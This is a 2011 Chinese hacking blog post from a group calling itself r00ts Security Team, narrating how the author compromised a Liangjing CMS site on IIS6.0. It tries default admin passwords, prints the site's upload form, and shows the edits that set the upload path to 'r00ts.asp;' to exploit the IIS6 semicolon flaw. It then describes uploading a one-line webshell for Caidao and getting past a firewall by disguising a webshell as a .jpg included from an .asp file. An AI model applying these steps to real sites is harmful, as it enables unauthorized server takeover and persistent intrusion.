@@ -1,0 +1,131 @@
+突破防火墙上传拿webshell【r00ts Security Team】2011-10-15 18:08突破防火墙上传拿webshell
+
+作者:落泪红尘【r00ts Security Team】
+
+转载请注明：http://hi.baidu.com/r00ts/blog/item/135b47fd3af411b3a50f520c.html
+
+=======================================================================
+
+ 
+
+完全是给菜鸟看的
+
+今天，朋友发了个后台给我，
+
+我一看，是良精的，IIS6.0，十分开心，以为一下子就拿下了
+
+看了下编辑器，进去了，试试了默认密码admin admin888 admin admin
+
+不行，数据库地址修改了，下载不了
+
+然后在后台找到了新闻，项目，各种发布。
+
+发现项目那里可以上传。
+
+不是编辑器上传
+
+XXX/manage/admin_upfile.asp
+
+其实这个地址不需要抓包才可以知道，你只需要上传一个图片，然后再地址栏里面输入xxx.com/就会出现链接，其中就会有上传地址。
+
+一般都是upfile upload的
+
+好了，进去了
+
+看了下源码，发现可以利用。
+
+
+==================================================================
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>无标题文档</title>
+<link href="css.css" rel="stylesheet" type="text/css">
+<script language="javascript">
+<!--
+function showpic(pic){
+  parent.LSP.innerHTML="<img src='" + pic + "' width=150>";
+  parent.LSP.style.visibility="visible";
+}
+-->
+</script>
+<style type="text/css">
+<!--
+body {
+ margin-left: 0px;
+ margin-top: 0px;
+ margin-right: 0px;
+ margin-bottom: 0px;
+ background-color: #F3F3F3;
+}
+-->
+</style>
+</head>
+
+<body>
+<table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#F3F3F3">
+<form name="form1" enctype="multipart/form-data" method="post" action="admin_UpfileSave.asp">
+  <tr>
+    <td>
+      <span class="tablebody2">      </span>
+      <input name="file" type="file" size="30" onChange="showpic(this.value)">
+      <input type="submit" name="Submit" value="上传">
+      <span class="tablebody2">
+      <input type="hidden" name="filepath" value="../uppics/">
+      <input name="NameControl" type="hidden" id="NameControl" value="hdnPicName">
+      <input name="IdControl" type="hidden" id="IdControl" value="hdnPicId">
+</span></td>
+  </tr>
+  </form>
+</table>
+</body>
+</html>
+
+========================================================
+
+你懂得：
+
+修改：<form name="form1" enctype="multipart/form-data" method="post" action="http://www.XXXX.com/manage/admin_UpfileSave.asp">
+
+      <input type="hidden" name="filepath" value="../uppics/r00ts.asp;">
+
+=========================================================
+
+修改了之后，点击上传，发现成功了，打开源码看了下，发现没有上传后的地址，纠结了。
+
+然后抓包，还是找不到地址。
+
+研究了一下之后，发现地址是在本地，找到了地址之后，哇哈哈,上传了一句话：
+
+用菜刀连接，在uppics目录上传了一个webshell，发现一进去就会跳转回www.xxx.com/uppics/r00ts.asp;当时是在uppics上传的，
+
+然后再根目录上传了一个asp大马，被拦截了，想了一下，认真的看了一下，这个网站是无FSO的,还有万恶的防火墙。
+
+然后上传了一个无FSO的大马，还是被拦截了
+
+然后呢，我在我怀疑是马的问题，修改了头文件，加了一个图片的txt
+
+上传成功了，黑客们，
+
+之后，我发现无FSO满足不了黑客。只是30KB，没什么功能。
+
+然后在webshell上传了一个正常的大马，不行。
+
+然后再纠结之下，看了看文件，什么之类的，还是觉得30KB的BS马满足不了我。
+
+发现可以这样做：
+
+把那个马改为jpg       1.jpg，然后新建一个asp，内容是<!--#include file="1.jpg" --> 为1.asp
+
+然后在地址输入www.xxxx.com/r00ts.asp，成功了，就这样，跳转过去r00ts.jpg了。
+
+直接是不行的
+
+这样的好处是可以防止别人查看你的密码，而且过了防火墙。
+
+短短的文字中透露了，有防火墙和没防火墙的压力。
+
+ 
+
+ 
